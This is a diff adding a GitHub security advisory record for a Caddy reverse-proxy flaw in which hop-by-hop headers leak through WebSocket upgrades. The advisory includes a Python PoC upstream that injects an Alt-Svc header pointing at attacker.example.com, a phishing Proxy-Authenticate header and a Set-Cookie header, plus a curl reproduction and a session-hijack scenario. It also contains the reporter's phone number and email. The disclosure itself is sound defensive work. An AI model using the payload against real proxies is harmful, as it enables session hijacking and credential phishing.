@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-8qx7-j2v2-x6q5",
+  "modified": "2026-10-28T20:00:03.849268583Z",
+  "published": "2026-10-28T19:49:33Z",
+  "aliases": [
+    "CVE-2026-55458"
+  ],
+  "summary": "Caddy has an RFC 7230 §6.1 compliance issue / Hop-by-hop headers that leak through",
+  "details": "### AI Disclosure\nThis vulnerability was discovered via deepseek-v4-pro[1m] for finding potential vulnerabilities / inconsistencies in the code base. I made the AI check if Caddy is compliant with various RFCs, incl. 7230. I also used it to help write the PoC, since it was honestly much faster than writing it by hand. I also let it write parts of this advisory text for brevity's sake, but had to rewrite half of it by hand.  \n\n### Summary\nCaddy's reverse proxy fails to strip RFC 7230 hop-by-hop headers from upstream responses when handling WebSocket upgrades (HTTP 101 Switching Protocols). Headers including `Alt-Svc`, `Keep-Alive`, `Proxy-Authenticate`, `Transfer-Encoding`, or `Trailer`, which Caddy actually correctly strips for normal HTTP responses, pass through unfiltered to the client during protocol upgrades. An upstream that sets these headers (intentionally or otherwise) can inject them into client responses, enabling connection hijacking via `Alt-Svc`, cookie injection via `Set-Cookie`, and proxy authentication phishing.\n\nThe normal response path in `finalizeResponse` correctly strips all hop-by-hop headers before forwarding, but the 101 code path returns early, skipping the stripping entirely.\n\n### Details\n\nIn `modules/caddyhttp/reverseproxy/reverseproxy.go`, the `finalizeResponse` method (line 1178) handles upstream responses. For all normal responses, it strips hop-by-hop headers before copying to the client:\n\n```go\n// reverseproxy.go:1194-1198\nremoveConnectionHeaders(res.Header)\nfor _, h := range hopHeaders {\n    res.Header.Del(h)\n}\n```\n\nHowever, the 101 Switching Protocols check at line 1187 returns before this stripping code:\n\n```go\n// reverseproxy.go:1186-1192\nif res.StatusCode == http.StatusSwitchingProtocols {\n    var wg sync.WaitGroup\n    h.handleUpgradeResponse(logger, \u0026wg, rw, req, res)\n    wg.Wait()\n    return nil  // \u003c-- returns BEFORE removeConnectionHeaders and hopHeaders loop\n}\n```\n\nInside `handleUpgradeResponse` (`streaming.go:60-91`), all upstream response headers are copied to the client without any hop-by-hop filtering:\n\n```go\n// streaming.go:88-91\ncopyHeader(rw.Header(), res.Header)        // copies ALL upstream headers\nnormalizeWebsocketHeaders(rw.Header())     // only remaps Sec-WebSocket-* keys\n```\n\nThe `normalizeWebsocketHeaders` function (line 714) only handles WebSocket-specific header key mapping (`Sec-Websocket-*` to `Sec-WebSocket-*`). It does not strip hop-by-hop headers.\n\n#### Hop-by-Hop Headers That Leak Through\n\nDefined at `reverseproxy.go:1681-1692`:\n\n```\nAlt-Svc, Connection, Proxy-Connection, Keep-Alive, Proxy-Authenticate,\nProxy-Authorization, Te, Trailer, Transfer-Encoding, Upgrade\n```\n\nAll 10 are stripped from normal responses. **None** are stripped from WebSocket upgrade responses.\n\nFor HTTP/2 and HTTP/3 WebSocket connections (extended CONNECT with `:protocol: websocket`), Caddy converts the upstream's 101 into a `200 OK` for the client (`streaming.go:99-104`). The leaked headers arrive in a standard HTTP 200 response that browsers fully process, making `Alt-Svc` hijacking and `Set-Cookie` injection practically exploitable.\n\nNormal (200): `removeConnectionHeaders()` runs, `hopHeaders` loop runs -\u003e  headers stripped\nUpgrade (101): `handleUpgradeResponse()` runs, returns early -\u003e headers are NOT stripped\n\nThis is the only response code path in the reverse proxy that bypasses hop-by-hop header stripping.\n\n### PoC\n\nCaddy config:\n```\n:8080 {\n    reverse_proxy localhost:8083\n}\n```\n\nScript:\n```python\nimport socket\n\nUPSTREAM = (\n    b\"HTTP/1.1 101 Switching Protocols\\r\\n\"\n    b\"Upgrade: websocket\\r\\n\"\n    b\"Connection: Upgrade\\r\\n\"\n    b\"Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\\r\\n\"\n    b\"Alt-Svc: h2=\\\"attacker.example.com:443\\\"; ma=86400\\r\\n\"\n    b\"Keep-Alive: timeout=999\\r\\n\"\n    b\"Proxy-Authenticate: Basic realm=\\\"phish\\\"\\r\\n\"\n    b\"Set-Cookie: injected=malicious; Path=/\\r\\n\"\n    b\"\\r\\n\"\n)\n\ns = socket.socket()\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ns.bind((\"0.0.0.0\", 8083))\ns.listen(1)\nconn, _ = s.accept()\nconn.send(UPSTREAM)\n```\n\nCurl:\n```bash\ncurl -v \\\n  -H \"Upgrade: websocket\" \\\n  -H \"Connection: Upgrade\" \\\n  -H \"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\" \\\n  -H \"Sec-WebSocket-Version: 13\" \\\n  http://localhost:8080/ws 2\u003e\u00261\n```\n\nOutput: \n```\n\u003c HTTP/1.1 101 Switching Protocols\n\u003c Alt-Svc: h2=\"attacker.example.com:443\"; ma=86400\n\u003c Connection: Upgrade\n\u003c Keep-Alive: timeout=999\n\u003c Proxy-Authenticate: Basic realm=\"phish\"\n\u003c Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\n\u003c Server: Caddy\n\u003c Set-Cookie: injected=malicious; Path=/\n\u003c Upgrade: websocket\n```\n\n`Alt-Svc`, `Keep-Alive`, and `Proxy-Authenticate` are hop-by-hop headers that MUST NOT be retransmitted by proxies per RFC 7230 §6.1. They all appear in the response.\n\nSame upstream, same headers but on a 200 response. \nCaddy strips `Alt-Svc` correctly:\n\n```bash\ncurl -v http://localhost:8080/\n# Alt-Svc is absent \n```\n\n### Impact\nThis is a hop-by-hop header leakage vuln (I think CWE-444 fits closest?). The proxy fails to enforce the RFC 7230 §6.1 requirement that hop-by-hop headers must not be forwarded across proxy boundaries.\n\nAny Caddy deployment that proxies WebSocket connections, especially those using HTTP/2 or HTTP/3 (where the 101-to-200 conversion makes headers fully processable by browsers) has this issue. \n\nHow an attack might look:\nA company serves app.example.com behind Caddy, with HTTP/2 enabled. The app uses WebSockets for real-time notifications (i.e. every page load opens one). The upstream app gets compromised (unpatched CMS plugin, leaked CI credential, dependency confusion). The attacker adds one line to the WebSocket handler: Set-Cookie: session=hijack; Path=/. \n\nNow every visitor to app.example.com gets the attacker's session cookie written into their browser. The app uses the session cookie as the sole authentication token. When a user reloads the page or navigates to another part of the app, their browser sends session=hijack along with the request. The attacker submits the same value from their own browser. They get logged in as that user.\n\nCaddy strips this header on normal HTTP responses. It strips hop-by-hop headers on the request side, basically everywhere except this path. \n\n### Suggested Fix\nI'll add my fix to the branch in this security advisory.\n\n### Contact Details\nIf you find this find worth your time you can contact me under d.ramadani@ieee.org or +43 (677) 63 397 910. In case this is something that will go public I'd be happy to be mentioned under my real name, Dionis Ramadani. \n\nThank you for taking the time, I hope this is something interesting for you.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/caddyserver/caddy/v2",
+        "purl": "pkg:golang/github.com/caddyserver/caddy/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.11.4",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-8qx7-j2v2-x6q5/GHSA-8qx7-j2v2-x6q5.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-8qx7-j2v2-x6q5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/caddyserver/caddy"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/caddyserver/caddy/releases/tag/v2.11.5"
+    }
+  ]
+}
